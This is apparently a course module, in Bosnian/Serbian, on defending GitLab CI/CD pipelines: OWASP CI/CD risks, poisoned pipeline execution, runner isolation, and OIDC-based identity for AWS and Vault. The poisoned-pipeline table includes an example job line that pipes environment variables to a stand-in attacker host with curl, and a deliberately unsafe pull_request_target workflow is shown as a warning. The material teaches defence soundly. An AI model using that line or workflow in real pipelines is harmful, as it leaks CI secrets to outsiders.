## Šta ovaj modul pokriva

Modul pokriva dva cilja iz domena 1:

- **1.3** Rizici CI/CD platforme (**OWASP Top 10 CI/CD Security Risks**), **poisoned pipeline execution** i izolacija runnera.
- **1.4** Identitet pipelinea: **OIDC / ID tokeni** prema oblaku i Vaultu, zaštićene grane i varijable, najmanje privilegije za jobove.

Gdje je ovo u pipelineu: ispod svih ostalih kontrola. Semgrep, Trivy i cosign štite aplikaciju; ovaj modul štiti **sam pipeline**. Ako napadač može izmijeniti `.gitlab-ci.yml` ili ukrasti token deploy joba, svi skeneri su bespredmetni: on ih jednostavno obriše ili zaobiđe.

Prijetnja koju sprječavamo: CI/CD sistem kao ulazna tačka u produkciju. Runner ima izvorni kod, tajne, pristup registryju i cloud nalogu. Napadi na Codecov (2021, izmijenjena uploader skripta koja je slala varijable okruženja), na SolarWinds (2020, kompromitovan build) i na popularne GitHub Actions (2025, izmijenjeni tagovi akcija koji su ispisivali tajne u logove) pokazuju da je ovo stvaran vektor, ne teorija.

## OWASP Top 10 CI/CD Security Risks

OWASP lista deset rizika specifičnih za CI/CD sisteme. Pamti ih po značenju, ne po broju:

| Oznaka | Naziv | Šta znači u GitLabu (primjer) | Glavna odbrana |
|---|---|---|---|
| CICD-SEC-1 | Insufficient Flow Control Mechanisms | Jedna osoba može pushati direktno na `main` i odmah deployati, bez reviewa | Protected branches, obavezni approvali, protected environments |
| CICD-SEC-2 | Inadequate Identity and Access Management | Bivši zaposleni još ima Maintainer ulogu, previše Ownera, dijeljeni nalozi | SSO, redovna revizija članstva, najmanje privilegije |
| CICD-SEC-3 | Dependency Chain Abuse | Dependency confusion, typosquatting, preuzet paket u `requirements.txt` | Lock fajlovi, privatni mirror, SCA, pinovanje |
| CICD-SEC-4 | Poisoned Pipeline Execution (PPE) | MR mijenja `.gitlab-ci.yml` ili skriptu koju job poziva i izvršava kod sa tajnama | Protected varijable, review CI fajlova, odvojena CI konfiguracija |
| CICD-SEC-5 | Insufficient PBAC (Pipeline-Based Access Controls) | Svaki job ima iste tajne i isti runner, test job može deployati u produkciju | Varijable po okruženju, odvojeni runneri, kratkotrajni tokeni po jobu |
| CICD-SEC-6 | Insufficient Credential Hygiene | Statički AWS ključ u CI varijabli godinama, tajna ispisana u logu | OIDC umjesto statičkih ključeva, rotacija, masked varijable, otkrivanje tajni |
| CICD-SEC-7 | Insecure System Configuration | Zastario self-managed GitLab, runner u privileged modu, otvoren registracioni token | Ažuriranje, hardening runnera, revizija postavki |
| CICD-SEC-8 | Ungoverned Usage of 3rd Party Services | Integracija ili aplikacija sa širokim API tokenom koju niko ne prati | Inventar integracija, minimalni scope, revizija |
| CICD-SEC-9 | Improper Artifact Integrity Validation | Deploy uzima sliku po tagu bez provjere ko ju je napravio | Potpisi, provenance, digest (modul 10) |
| CICD-SEC-10 | Insufficient Logging and Visibility | Niko ne gleda audit log; ne zna se ko je promijenio varijablu | Audit events u SIEM, alarmi na promjene postavki |

> **U praksi:** CICD-SEC-6 je najčešći nalaz u revizijama. Prođi kroz Settings → CI/CD → Variables u svim projektima i grupama i napravi spisak: koliko statičkih cloud ključeva postoji, ko ih je napravio i kada. Taj spisak je tvoj plan migracije na OIDC.

## Poisoned Pipeline Execution

**Poisoned Pipeline Execution (PPE)** znači da napadač, bez prava da direktno mijenja pipeline na zaštićenoj grani, ubaci kod koji će pipeline izvršiti. Tri varijante (terminologija iz OWASP-a i originalnog istraživanja):

| Varijanta | Kako | Primjer u kurs-shop |
|---|---|---|
| **Direct PPE (D-PPE)** | Napadač mijenja sam CI fajl u svojoj grani ili MR-u | U feature grani doda u `.gitlab-ci.yml` job `- env \| curl -d @- https://napadac.example` |
| **Indirect PPE (I-PPE)** | CI fajl je zaštićen, ali job poziva fajlove iz repoa: `Makefile`, `scripts/*.sh`, `setup.py`, `conftest.py`, `package.json` scripts | Izmijeni `tests/conftest.py`; job `test` ga izvrši sa `pytest` |
| **Public PPE (3PE)** | Isto, ali napadač je izvana: MR iz forka u javni projekat | Fork otvori MR, maintainer pokrene pipeline u parent projektu |

Šta je zajedničko: **pipeline vjeruje sadržaju grane koju nije pregledao čovjek**. Odbrana se zato zasniva na tome da neprovjeren kod ne dobija tajne.

### Odbrana u GitLabu

1. **Protected varijable.** Varijabla označena kao *Protected* dostupna je samo pipelineima na protected granama i tagovima. Feature grana iz D-PPE napada je ne vidi.
2. **Protected branches.** Na `main` niko ne pusha direktno; merge samo kroz MR sa approvalom. Force push isključen.
3. **CODEOWNERS za CI fajlove.** Izmjene `.gitlab-ci.yml`, `ci/` i skripti koje pipeline poziva traže odobrenje platform/security tima:

```text
# .gitlab/CODEOWNERS
[CI konfiguracija]
/.gitlab-ci.yml        @shop/platform
/ci/                   @shop/platform
/scripts/              @shop/platform
```

(Da bi CODEOWNERS blokirao merge, na protected grani mora biti uključeno „Require approval from code owners“.)

4. **CI konfiguracija van repoa.** U Settings → CI/CD → General pipelines → *CI/CD configuration file* možeš zadati putanju u drugom projektu, npr. `kurs-shop.yml@shop/ci-config`. Developer tada ne može mijenjati definiciju pipelinea iz svoje grane. Za obavezne sigurnosne jobove u svim projektima GitLab Ultimate ima **pipeline execution policies**.
5. **Fork MR-ovi.** Pipeline za MR iz forka podrazumijevano radi u forku, bez varijabli parent projekta. Kad maintainer pokrene pipeline u parent projektu, taj kod dobija pristup parent varijablama (pa i protected i masked, ako ih pipeline može vidjeti). Prvo pročitaj diff, posebno CI fajlove i skripte.
6. **Pinovani `include`.** Dijeljeni šabloni se uključuju sa fiksnom verzijom, ne sa `main` granom koju neko drugi mijenja:

```yaml
include:
  - project: shop/ci-templates
    ref: v1.4.0                       # tag (ili SHA commita), ne main
    file: /templates/security.yml
  - component: gitlab.kurs-shop.ba/shop/components/secret-scan@1.2.0
```

7. **Ograniči pipeline varijable.** Postavka *Minimum role to use pipeline variables* određuje ko smije pri ručnom pokretanju ili preko API-ja zadati varijable koje pregaze one iz konfiguracije. Na GitLab.com novi projekti u novim namespaceovima imaju `no_one_allowed`; na self-managed instanci provjeri i postavi ručno.

### GitHub Actions ekvivalenti

```yaml
# Opasno: pull_request_target radi sa tajnama i write tokenom base repoa,
# a ovdje se checkoutuje i izvršava kod iz forka. Klasičan 3PE.
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: make test
```

Odbrana: za kod iz forka koristi `pull_request` (bez tajni, read-only token), postavi `permissions:` na minimum i pinuj akcije na puni SHA commita (tag akcije se može preusmjeriti, kao u napadu na `tj-actions/changed-files` 2025).

```yaml
permissions:
  contents: read
steps:
  - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

> **U praksi:** PPE se najčešće ne dešava preko `.gitlab-ci.yml` (to ljudi gledaju), nego preko `Makefile`, `package.json` skripti, `conftest.py` ili `setup.py`. Kad radiš threat model pipelinea, za svaki job zapiši koje fajlove iz repoa izvršava. Ako job ima tajne, ti fajlovi su jednako osjetljivi kao CI konfiguracija.

## Izolacija runnera

**Runner** izvršava kod iz repoa. Ako je kompromitovan, napadač ima sve što runner vidi: tajne trenutnog joba, keš, artefakte i, ako je runner dijeljen i trajan, potencijalno i podatke drugih jobova.

### Principi

- **Kratkotrajni (ephemeral) izvršioci.** Svaki job u novom kontejneru, podu ili VM-u, koji se nakon joba uništava. Kubernetes executor ili autoscaling runneri. Trajni shell runner na jednom serveru je najgora opcija: jedan job može ostaviti backdoor za sljedeći.
- **Bez privileged moda i bez Docker socketa.** `privileged = true` ili montiran `/var/run/docker.sock` daju jobu praktično root na hostu. Za build slika koristi BuildKit u rootless modu, Kaniko ili Buildah (u labu pravimo slike bez daemona alatom `crane`).
- **Odvojeni runneri po povjerenju.** Deploy u produkciju ide na poseban runner koji je *protected* (izvršava samo jobove sa protected grana i tagova) i ima uži tag. MR iz feature grane nikad ne dolazi na taj runner.
- **Mreža.** Runner za testove ne treba pristup produkcijskoj bazi ni cloud metadata servisu. Mrežne politike ili security grupe ograničavaju izlaz.
- **Registracija.** Koristi nove runner authentication tokene (kreirane u UI-ju) umjesto starih registracionih tokena, i ne dijeli ih.

### Primjer config.toml (Docker executor)

```toml
[[runners]]
  name = "kurs-shop-test"
  executor = "docker"
  [runners.docker]
    image = "python:3.13-slim"
    privileged = false
    allowed_images = ["127.0.0.1:5000/*"]
    allowed_pull_policies = ["always"]
    volumes = ["/cache"]          # bez /var/run/docker.sock
    disable_cache = false
```

### Rutiranje jobova na runnere

```yaml
deploy-prod:
  stage: deploy
  tags: [prod-deploy]               # samo protected runner sa ovim tagom
  environment:
    name: production
  rules:
    - if: $CI_COMMIT_TAG =~ /^v\d+\.\d+\.\d+$/
  script:
    - ./scripts/deploy.sh
```

Tag sam po sebi nije sigurnosna granica (bilo ko može napisati `tags: [prod-deploy]` u svojoj grani). Granica je to što je runner označen kao **protected**: job iz neprotected grane na njemu neće ni krenuti.

> **U praksi:** shared runneri na GitLab.com su ephemeral VM-ovi i za većinu jobova su sigurniji od kućnog shell runnera. Self-managed runnere uvodi tamo gdje ti treba pristup internoj mreži, pa ih tretiraj kao produkcijske servere: hardening, ažuriranja, logovanje i odvajanje po nivou povjerenja.

## Identitet pipelinea

Stari model: u CI varijabli stoji `AWS_ACCESS_KEY_ID` i `AWS_SECRET_ACCESS_KEY` sa širokim pravima, isti za sve jobove, bez roka trajanja. Kad procuri (ispis u logu, PPE, napad na runner), važi dok ga neko ručno ne opozove.

Novi model: **job dokazuje ko je** kratkotrajnim, potpisanim **OIDC ID tokenom** (JWT), a cloud ili Vault na osnovu claimova iz tokena izdaje kratkotrajne kredencijale sa minimalnim pravima.

### ID tokeni u GitLabu

ID token se definiše po jobu, sa **audience** (`aud`) koja kaže kome je token namijenjen:

```yaml
deploy-staging:
  id_tokens:
    AWS_ID_TOKEN:
      aud: https://gitlab.kurs-shop.ba
    VAULT_ID_TOKEN:
      aud: https://vault.kurs-shop.ba
  script:
    - echo "token je u varijabli \$AWS_ID_TOKEN, ne ispisuj ga"
```

Važno:

- Stare predefinisane varijable `CI_JOB_JWT` i `CI_JOB_JWT_V2` su **uklonjene u GitLabu 17.0**. Ako ih stari pipeline koristi, autentifikacija pada. Zamjena je `id_tokens`.
- Token je potpisan (RS256), izdavač (`iss`) je URL GitLab instance, a ističe sa timeoutom joba.
- Svaki token ima svoj `aud`. Token za Vault ne bi trebalo da bude prihvaćen u AWS-u i obrnuto: zato pravi različite tokene sa različitim audience vrijednostima.

Claimovi koje ćeš najčešće provjeravati:

| Claim | Primjer | Za šta |
|---|---|---|
| `sub` | `project_path:shop/kurs-shop:ref_type:branch:ref:main` | Glavni identitet: projekat + grana/tag |
| `project_path` | `shop/kurs-shop` | Samo ovaj projekat |
| `namespace_path` | `shop` | Cijela grupa |
| `ref`, `ref_type` | `main`, `branch` | Samo određena grana ili tagovi |
| `ref_protected` | `"true"` | Samo protected grane/tagovi (štiti od D-PPE iz feature grane) |
| `environment`, `environment_protected` | `production`, `"true"` | Samo jobovi koji deployaju u zaštićeno okruženje |
| `pipeline_source` | `push`, `merge_request_event` | Npr. odbiti MR pipeline |
| `user_login`, `user_email` | `andrija` | Audit: ko je pokrenuo pipeline |

### GitLab → AWS bez statičkih ključeva

U AWS-u napraviš IAM OIDC provider za `https://gitlab.kurs-shop.ba` i rolu sa trust policyjem koji provjerava `aud` i `sub`:

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "Federated": "arn:aws:iam::111122223333:oidc-provider/gitlab.kurs-shop.ba" },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "gitlab.kurs-shop.ba:aud": "https://gitlab.kurs-shop.ba",
        "gitlab.kurs-shop.ba:sub": "project_path:shop/kurs-shop:ref_type:branch:ref:main"
      }
    }
  }]
}
```

Job razmjenjuje ID token za privremene kredencijale:

```yaml
deploy-infra:
  stage: deploy
  id_tokens:
    AWS_ID_TOKEN:
      aud: https://gitlab.kurs-shop.ba
  rules:
    - if: $CI_COMMIT_BRANCH == "main"
  script:
    - >
      CREDS=$(aws sts assume-role-with-web-identity
      --role-arn arn:aws:iam::111122223333:role/kurs-shop-deploy
      --role-session-name "gitlab-$CI_PIPELINE_ID-$CI_JOB_ID"
      --web-identity-token "$AWS_ID_TOKEN"
      --duration-seconds 900
      --query Credentials --output json)
    - export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r .AccessKeyId)
    - export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r .SecretAccessKey)
    - export AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r .SessionToken)
    - terraform -chdir=infra apply -auto-approve
```

Česte greške u trust policyju:

- `StringLike` sa `project_path:shop/*` ili samo provjera `aud`: svaki projekat u grupi (ili na instanci) može preuzeti rolu.
- Provjera samo `project_path` bez grane: i job iz feature grane (D-PPE) dobija produkcijske kredencijale.
- Ista rola za plan i apply: MR pipeline treba read-only rolu za `terraform plan`, a samo `main` rolu sa pravom izmjene.

### GitLab → Vault

Isti princip važi za Vault. JWT auth metoda provjerava potpis tokena preko JWKS-a GitLab instance, a rola veže claimove (detaljno u modulu 04):

```bash
vault auth enable jwt
vault write auth/jwt/config \
    oidc_discovery_url="https://gitlab.kurs-shop.ba" \
    bound_issuer="https://gitlab.kurs-shop.ba"

vault write auth/jwt/role/kurs-shop-prod - <<'EOF'
{
  "role_type": "jwt",
  "bound_audiences": ["https://vault.kurs-shop.ba"],
  "user_claim": "user_login",
  "bound_claims": {
    "project_path": "shop/kurs-shop",
    "ref_protected": "true",
    "ref_type": "branch"
  },
  "token_policies": ["kurs-shop-prod-read"],
  "token_ttl": "10m",
  "token_max_ttl": "15m"
}
EOF
```

U pipelineu, sa **`secrets:vault`** runner sam obavlja prijavu i preuzimanje tajne:

```yaml
deploy-prod:
  id_tokens:
    VAULT_ID_TOKEN:
      aud: https://vault.kurs-shop.ba
  variables:
    VAULT_SERVER_URL: https://vault.kurs-shop.ba
    VAULT_AUTH_ROLE: kurs-shop-prod
  secrets:
    DB_PASSWORD:
      vault: kurs-shop/prod/db/password@secret   # putanja/polje@mount
      token: $VAULT_ID_TOKEN
      file: false
  script:
    - ./scripts/deploy.sh
```

(`secrets:vault` je funkcija GitLab Premium/Ultimate. U Free verziji isto se radi ručno: `vault write auth/jwt/login role=... jwt=$VAULT_ID_TOKEN`.)

### Statički tokeni vs OIDC

| | Statički ključ u CI varijabli | OIDC ID token + kratkotrajni kredencijali |
|---|---|---|
| Trajanje | Dok ga neko ne opozove | Minuti (TTL role/sesije) |
| Vezan za | Ništa; radi sa bilo koje mašine | Projekat, granu, okruženje (claimovi) |
| Rotacija | Ručna, često zaboravljena | Nije potrebna |
| Šteta ako procuri | Velika, dugo | Mala, kratko, samo iz definisanog konteksta |
| Audit | Teško: ko je koristio ključ? | Session name i claimovi u CloudTrailu / Vault audit logu |

> **U praksi:** migracija sa statičkih ključeva ide servis po servis. Prvo napravi OIDC rolu i job koji je koristi u paraleli sa starim ključem, provjeri u CloudTrailu da se stari ključ više ne koristi (`LastUsedDate` u IAM-u), pa tek onda obriši ključ i varijablu.

## Zaštićene grane, varijable i okruženja

Identitet sam po sebi ne pomaže ako napadač može pokrenuti job koji ima „dobar“ identitet. Zato kombinuješ:

| Mehanizam | Šta radi | Štiti od |
|---|---|---|
| **Protected branch/tag** | Ograničava ko smije pushati, mergeati, force pushati; tagovi `v*` samo za Maintainere | Direktne izmjene `main`, lažni release tag |
| **Protected variable** | Dostupna samo pipelineima na protected granama/tagovima | D-PPE iz feature grane |
| **Masked variable** | Vrijednost se zamjenjuje sa `[MASKED]` u logu joba (min. 8 znakova, jedna linija) | Slučajan ispis u logu |
| **Masked and hidden** | Kao masked, plus vrijednost se više ne može vidjeti u UI-ju nakon kreiranja | Čitanje vrijednosti od strane drugih Maintainera |
| **Environment scope varijable** | Varijabla samo za jobove sa `environment: production` | Test job sa produkcijskom tajnom (CICD-SEC-5) |
| **Protected environment** | Samo određeni korisnici/grupe smiju deployati; opcionalno obavezni approvali | Deploy u produkciju bez odobrenja (CICD-SEC-1) |

Masking **nije** zaštita od zlonamjernog koda. Job koji ima varijablu može je ispisati base64 kodiranu, obrnutu ili poslati na mrežu. Masking štiti od nehotičnog ispisa, protected štiti od toga da neprovjeren kod uopšte dobije varijablu. Zato tajne koje trebaju samo deployu treba držati kao protected + environment-scoped, ili još bolje u Vaultu iza `ref_protected` claima.

### CI_JOB_TOKEN

Svaki job dobija `CI_JOB_TOKEN`, kratkotrajni token za GitLab API (kloniranje, registry, paketi). Ograniči ga:

- u Settings → CI/CD → *Job token permissions* drži uključenu listu dozvoljenih projekata/grupa (allowlist) koji smiju pristupati tvom projektu ovim tokenom;
- ne koristi personal access token korisnika u CI varijabli tamo gdje job token ili deploy token sa uskim scopeom radi isti posao.

### Najmanje privilegije po jobu

```yaml
variables:
  GIT_DEPTH: "50"            # dovoljno za diff-skenove, ne cijela istorija

sast:
  stage: test
  # nema id_tokens, nema secrets: SAST-u ne treba nikakav identitet
  script:
    - semgrep scan --config /opt/kurs/semgrep-rules/ --metrics=off --error .

plan:
  stage: plan
  id_tokens:
    AWS_ID_TOKEN: { aud: https://gitlab.kurs-shop.ba }
  # rola kurs-shop-plan: samo read (sub dozvoljava i MR grane)
  script: [ "./ci/aws-login.sh kurs-shop-plan && terraform -chdir=infra plan" ]

apply:
  stage: deploy
  environment: { name: production }
  id_tokens:
    AWS_ID_TOKEN: { aud: https://gitlab.kurs-shop.ba }
  rules:
    - if: $CI_COMMIT_BRANCH == "main"
  # rola kurs-shop-apply: trust policy traži ref main i protected okruženje
  script: [ "./ci/aws-login.sh kurs-shop-apply && terraform -chdir=infra apply -auto-approve" ]
```

> **U praksi:** napravi tabelu „job → koji identitet → koja prava“. Skeneri (gitleaks, Semgrep, Trivy fs, Checkov) ne trebaju nikakve tajne i trebaju raditi na najmanje povjerljivim runnerima. Tajne i jaki identiteti idu samo jobovima koji ih stvarno koriste, na protected granama.

## Vidljivost i audit

CICD-SEC-10 se rješava logovima koje neko gleda:

- GitLab **audit events** (promjene varijabli, protected postavki, članstva, runnera) šalji u SIEM preko audit event streaminga (Ultimate) ili periodično preko API-ja.
- CloudTrail događaji `AssumeRoleWithWebIdentity` pokazuju koji projekat i grana su preuzeli rolu (session name sadrži ID pipelinea i joba).
- Vault **audit device** bilježi svaku prijavu i čitanje tajne.
- Alarmi za rizične događaje: isključena zaštita grane, nova instance-level varijabla, novi runner, force push na `main`.

## Lokalno u labu

Ovo možeš isprobati u labu bez GitLab servera, nad YAML-om:

```bash
cd /root/kurs-shop
# koji jobovi koriste id_tokens i koje audience?
yq '.[] | select(has("id_tokens")) | .id_tokens' .gitlab-ci.yml

# ima li negdje zastarjelog CI_JOB_JWT?
grep -rn 'CI_JOB_JWT' .gitlab-ci.yml ci/ 2>/dev/null

# include bez fiksnog ref-a?
yq '.include[] | select(has("project") and (has("ref") | not))' .gitlab-ci.yml

# pokreni pipeline lokalno; varijable koje bi bile protected ovdje su u fajlu
gitlab-ci-local --list
```

## Rezime

- **OWASP Top 10 CI/CD** (CICD-SEC-1 … 10) opisuje rizike platforme: od slabe kontrole toka i IAM-a, preko **PPE** i loše higijene kredencijala, do nedostatka integriteta artefakata i logovanja.
- **PPE** (direktni, indirektni, javni): pipeline izvršava kod koji niko nije pregledao. Odbrana: protected varijable, CODEOWNERS za CI fajlove i skripte, CI konfiguracija van repoa, oprez sa fork MR-ovima, pinovan `include`.
- Runneri: ephemeral, bez privileged moda i Docker socketa, odvojeni po povjerenju; produkcijski deploy samo na **protected** runneru.
- `CI_JOB_JWT` je uklonjen (GitLab 17.0); koristi **`id_tokens`** sa posebnim `aud` za svaki cilj.
- Cloud i Vault role vežu se za claimove (`sub`, `project_path`, `ref`, `ref_protected`, `environment`), nikad samo za `aud` ili široki wildcard.
- Masked štiti od slučajnog ispisa, **protected** od toga da neprovjeren kod dobije tajnu; environment scope i protected environments odvajaju produkciju.
- Svaki job dobija samo identitet i prava koja mu trebaju; skeneri ne trebaju nikakve tajne.
